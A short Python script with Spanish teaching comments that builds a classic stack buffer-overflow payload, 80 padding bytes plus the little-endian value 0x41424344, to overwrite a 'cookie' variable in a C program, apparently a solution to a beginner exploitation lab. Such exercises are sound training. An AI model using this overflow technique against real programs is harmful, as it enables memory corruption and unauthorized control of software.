import sys

# La 'b' adelante de las comillas le dice a Python que trate esto como BYTES crudos, no como texto normal.
relleno = b"A" * 80 

# 2. EL VALOR OBJETIVO (Target)
# Acá ponemos el valor que queremos que pise a la variable 'cookie'.
# Recordá el Little Endian: el 0x41424344 se escribe al revés.
cookie_val = b"\x44\x43\x42\x41"

#3. EL PAYLOAD FINAL
payload = relleno + cookie_val

# 4. LA INYECCIÓN
# Usamos sys.stdout.buffer.write para escupir los bytes puros a la terminal.
# Le sumamos un b"\n" al final que simula la tecla 'Enter' para que el programa en C avance.
sys.stdout.buffer.write(payload + b"\n")
